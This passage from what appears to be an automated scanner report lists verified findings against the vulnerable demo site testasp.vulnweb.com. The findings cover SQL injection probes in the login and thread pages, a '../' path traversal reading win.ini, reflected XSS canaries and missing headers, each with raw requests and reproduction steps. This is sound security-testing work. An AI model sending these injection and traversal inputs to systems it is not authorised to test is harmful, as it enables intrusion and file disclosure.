- Verification notes (engine-recorded): single+double quote variants reproduce DB error: True
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
- Evidence chain (engine-recorded):
    * [status_oracle] quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-01128508 (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=1%27
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    cache-control: private
    content-length: 1208
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:30 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\x0d
    <html xmlns="http://www.w3.org/1999/xhtml">\x0d
    <head>\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>\x0d
    <title>500 - Internal server error.</title>\x0d
    <style type="text/css">\x0d
    <!--\x0d
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\x0d
    fieldset{padding:0 15px 10px 15px;} \x0d
    h1{font-size:2.4em;margin:0;color:#FFF;}\x0d
    h2{font-size:1.7em;margin:0;color:#CC0000;} \x0d
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \x0d
    ... [17 more lines, 1294 chars total]
  elapsed_ms: 352.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Search.asp with the tested parameter 'tfSearch' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (status_oracle)

## [TESTASP F03] sql_injection — critical (engine verdict: verified)

- Surface: POST http://testasp.vulnweb.com/Login.asp (parameter: `tfUName`)
- Engine verdict: verified via `error:replay-2variants` | confidence 0.9 | rounds 2
- Verification notes (engine-recorded): single+double quote variants reproduce DB error: True
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
- Evidence chain (engine-recorded):
    * [status_oracle] quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
    * [status_oracle] quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0edd625f (exactly as issued by the engine) ---
  POST /Login.asp?RetURL=%2FDefault.asp%3F
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=1%27&tfUPass=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    cache-control: private
    content-length: 1208
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:46 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\x0d
    <html xmlns="http://www.w3.org/1999/xhtml">\x0d
    <head>\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>\x0d
    <title>500 - Internal server error.</title>\x0d
    <style type="text/css">\x0d
    <!--\x0d
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\x0d
    fieldset{padding:0 15px 10px 15px;} \x0d
    h1{font-size:2.4em;margin:0;color:#FFF;}\x0d
    h2{font-size:1.7em;margin:0;color:#CC0000;} \x0d
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \x0d
    ... [17 more lines, 1294 chars total]
  elapsed_ms: 341.7
  --- RAW REQUEST req-fec8ea53 (exactly as issued by the engine) ---
  POST /Login.asp
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=1%27&tfUPass=sentinel
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    cache-control: private
    content-length: 1208
    content-type: text/html
    date: Sat, 03 Oct 2026 01:20:08 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\x0d
    <html xmlns="http://www.w3.org/1999/xhtml">\x0d
    <head>\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>\x0d
    <title>500 - Internal server error.</title>\x0d
    <style type="text/css">\x0d
    <!--\x0d
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\x0d
    fieldset{padding:0 15px 10px 15px;} \x0d
    h1{font-size:2.4em;margin:0;color:#FFF;}\x0d
    h2{font-size:1.7em;margin:0;color:#CC0000;} \x0d
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \x0d
    ... [17 more lines, 1294 chars total]
  elapsed_ms: 327.3
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://testasp.vulnweb.com/Login.asp with the tested parameter 'tfUName' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (status_oracle)

## [TESTASP F04] sql_injection — critical (engine verdict: verified)

- Surface: POST http://testasp.vulnweb.com/Login.asp (parameter: `tfUPass`)
- Engine verdict: verified via `error:replay-2variants` | confidence 0.9 | rounds 2
- Verification notes (engine-recorded): single+double quote variants reproduce DB error: True
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
- Evidence chain (engine-recorded):
    * [status_oracle] quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
    * [status_oracle] quote -> HTTP 500 (generic error, no DB string) while base -> 200 and doubled-quote -> 200 — SQL syntax break
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-d0c53b1a (exactly as issued by the engine) ---
  POST /Login.asp?RetURL=%2FDefault.asp%3F
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=sentinel&tfUPass=1%27
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    cache-control: private
    content-length: 1208
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:53 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\x0d
    <html xmlns="http://www.w3.org/1999/xhtml">\x0d
    <head>\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>\x0d
    <title>500 - Internal server error.</title>\x0d
    <style type="text/css">\x0d
    <!--\x0d
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\x0d
    fieldset{padding:0 15px 10px 15px;} \x0d
    h1{font-size:2.4em;margin:0;color:#FFF;}\x0d
    h2{font-size:1.7em;margin:0;color:#CC0000;} \x0d
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \x0d
    ... [17 more lines, 1294 chars total]
  elapsed_ms: 320.9
  --- RAW REQUEST req-8f46e522 (exactly as issued by the engine) ---
  POST /Login.asp
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=sentinel&tfUPass=1%27
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    cache-control: private
    content-length: 1208
    content-type: text/html
    date: Sat, 03 Oct 2026 01:20:17 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\x0d
    <html xmlns="http://www.w3.org/1999/xhtml">\x0d
    <head>\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>\x0d
    <title>500 - Internal server error.</title>\x0d
    <style type="text/css">\x0d
    <!--\x0d
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\x0d
    fieldset{padding:0 15px 10px 15px;} \x0d
    h1{font-size:2.4em;margin:0;color:#FFF;}\x0d
    h2{font-size:1.7em;margin:0;color:#CC0000;} \x0d
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \x0d
    ... [17 more lines, 1294 chars total]
  elapsed_ms: 359.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://testasp.vulnweb.com/Login.asp with the tested parameter 'tfUPass' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (status_oracle)

## [TESTASP F05] sql_injection — critical (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/showthread.asp (parameter: `id`)
- Engine verdict: verified via `oracle:replay-2round` | confidence 0.95 | rounds 2
- Verification notes (engine-recorded): replay TRUE=200 FALSE=500
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
- Evidence chain (engine-recorded):
    * [response_diff] TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-06971bc1 (exactly as issued by the engine) ---
  GET /showthread.asp?id=3+AND+1%3D1
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 4197
    content-type: text/html
    date: Sat, 03 Oct 2026 01:19:37 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum\x0d
    aaa\x0d
    </title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    ... [60 more lines, 4213 chars total]
  elapsed_ms: 334.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/showthread.asp with the tested parameter 'id' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (response_diff)

## [TESTASP F06] path_traversal — high (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Templatize.asp (parameter: `item`)
- Engine verdict: verified via `re-test:same-marker-alt-depth` | confidence 0.9 | rounds 3
- Verification notes (engine-recorded): alternative depth payload '../../../../windows/win.ini' reproduces leak: True
- Impact (engine-assessed): proven — File reads outside the document root proven with a marker file — arbitrary local file disclosure (configuration, secrets, source) is reachable.
- Evidence chain (engine-recorded):
    * [file_marker] content of win.ini leaked (marker '[fonts]' at offset 1905)
    * [file_marker] content of win.ini leaked (marker '[fonts]' at offset 1949)
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e5e9a082 (exactly as issued by the engine) ---
  GET /Templatize.asp?item=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2783
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:25 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>Untitled Document</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [32 more lines, 2914 chars total]
  elapsed_ms: 326.0
  --- RAW REQUEST req-2805798a (exactly as issued by the engine) ---
  GET /Templatize.asp?item=..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2827
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:26 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>Untitled Document</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [32 more lines, 2958 chars total]
  elapsed_ms: 326.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Templatize.asp with the tested parameter 'item' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (file_marker)

## [TESTASP F07] xss_reflected — high (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Search.asp (parameter: `tfSearch`)
- Engine verdict: verified via `re-test:variant-battery-6` | confidence 0.9 | rounds 6
- Verification notes (engine-recorded): 6/6 diverse vectors reflected raw (WAF-resistant verification)
- Impact (engine-assessed): proven — Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.
- Evidence chain (engine-recorded):
    * [unescaped_reflection] canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><table width="100%" cel… [ctx: … </form>               <div class='path'>You searched for '<sentinelxssmarker>pro41</sentinelxssmarker>'</div><table width
    * [unescaped_reflection] canary reflected raw in context: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel… [ctx: … </form>               <div class='path'>You searched for '<sentinelxssmarkerpro42'</div><table width="100%" cel…]
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0519aaae (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=%3Csentinelxssmarker%3Epro41%3C%2Fsentinelxssmarker%3E
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3887
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:35 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum search</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [31 more lines, 4015 chars total]
  elapsed_ms: 355.7
  --- RAW REQUEST req-9cdcb517 (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=%3Csentinelxssmarkerpro42
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3424
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:37 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum search</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [31 more lines, 3552 chars total]
  elapsed_ms: 346.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Search.asp with the tested parameter 'tfSearch' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (unescaped_reflection)

## [TESTASP F08] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-d42908cd (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3538
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:20 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum forums</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [33 more lines, 3672 chars total]
  elapsed_ms: 338.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F09] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/styles.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-eb3974b8 (exactly as issued by the engine) ---
  GET /styles.css
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 3390
    content-type: text/css
    date: Sat, 03 Oct 2026 01:15:21 GMT
    etag: "cea5331f85c1c81:0"
    last-modified: Thu, 29 May 2008 12:11:27 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    body {\x0d
    	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;\x0d
    	font-size: 12px;\x0d
    	margin: 0;\x0d
    }\x0d
    \x0d
    td {\x0d
    	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;\x0d
    	font-size: 12px;\x0d
    }\x0d
    \x0d
    th {\x0d
    ... [177 more lines, 3956 chars total]
  elapsed_ms: 359.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/styles.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F10] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Templatize.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-47d077ba (exactly as issued by the engine) ---
  GET /Templatize.asp?item=html%2Fabout.html
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 4598
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:21 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>Untitled Document</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [49 more lines, 4180 chars total]
  elapsed_ms: 349.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Templatize.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F11] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Default.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-92a1d0ed (exactly as issued by the engine) ---
  GET /Default.asp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3538
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:40 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum forums</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [33 more lines, 3672 chars total]
  elapsed_ms: 351.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Default.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASP F12] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Search.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ec2c1214 (exactly as issued by the engine) ---
  GET /Search.asp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2809
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:41 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum search</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [31 more lines, 2937 chars total]
  elapsed_ms: 338.2
  --- RAW REQUEST req-c38cfbfb (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=1
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3718
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:29 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
